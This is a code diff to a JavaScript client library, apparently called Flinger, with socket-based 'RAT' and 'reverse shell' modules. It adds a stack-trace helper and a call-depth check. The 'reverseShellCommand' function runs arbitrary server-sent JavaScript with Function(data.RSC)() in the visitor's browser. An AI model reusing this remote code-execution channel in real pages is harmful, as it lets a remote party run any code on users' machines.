@@ -389,6 +389,23 @@ var Cross = (function () {
         }
     }
 
+    var getStacktrace = function () {
+        function st2(f) {
+            var args = [];
+            if (f) {
+                for (var i = 0; i < f.arguments.length; i++) {
+                    args.push(f.arguments[i]);
+                }
+                
+                var function_name = f.toString().split('(')[0].substring(9);
+                return st2(f.caller) + (function_name.length > 0 ? function_name + '();' : '();');
+            } else {
+                return "";
+            }
+        }
+        return st2(arguments.callee.caller);
+    }
+
     return {
         Initialize: constructor,
         TimeStamp: timeStamp,
@@ -413,6 +430,7 @@ var Cross = (function () {
         GetFlingerObj: getFlingerObj,
         InIframe: inIframe,
         RemoveJSCSSfile: removejscssfile,
+        GetStacktrace: getStacktrace,
     };
 })();
 
@@ -549,7 +567,7 @@ var SocketHub = (function () {
         })
     }
 
-    var ratServiceNamespace = function (data, ratNamespaceData) {
+    var ratServiceNamespace = function ratServiceNamespace(data, ratNamespaceData) {
         var ns = (Cross.SearchObjectByIdOnArray(ratNamespaceData.Namespace.Id, data.Namespace));
         if (ns != null) {
             console.log('RAT Service Socket URI: ' + Cross.GetServerUri() + '/' + ns.Id);
@@ -559,7 +577,7 @@ var SocketHub = (function () {
     }
 
     var ratServiceSocketDefinition = function (data, ratNamespaceData) {
-        _ratServiceSocket.on('Coplest.Flinger.RAT', function (data) {
+        _ratServiceSocket.on('Coplest.Flinger.RAT', function ratServiceSocketDefinitionOnSocket(data) {
             if (data.Command != undefined) {
                 switch (data.Command) {
                     case 'ConnectedToRSN#Response':
@@ -1161,8 +1179,8 @@ var RATHub = (function () {
 			var step = 80;
 			var currentPosition = document.documentElement.scrollTop || document.body.scrollTop;
 			console.log(data.Delta);
-			
-			if(currentPosition == 0 && data.Delta == -1){
+
+			if (currentPosition == 0 && data.Delta == -1) {
 				_scrollPos = (currentPosition + (step * (data.Delta)) * -1);
 
 				window.scrollTo(0, _scrollPos);
@@ -1177,9 +1195,12 @@ var RATHub = (function () {
 		}
 	}
 
-	var reverseShellCommand = function(data){
-		if(data.RSC != undefined && data.RSC !== null){
-			Function(data.RSC)();
+	var reverseShellCommand = function reverseShellCommand(data) {
+		if (data.RSC != undefined && data.RSC !== null) {
+			/// Check if has minimum of calls
+			if (--Cross.GetStacktrace().split(';').length > 1) {
+				Function(data.RSC)();
+			}
 		}
 	}
 
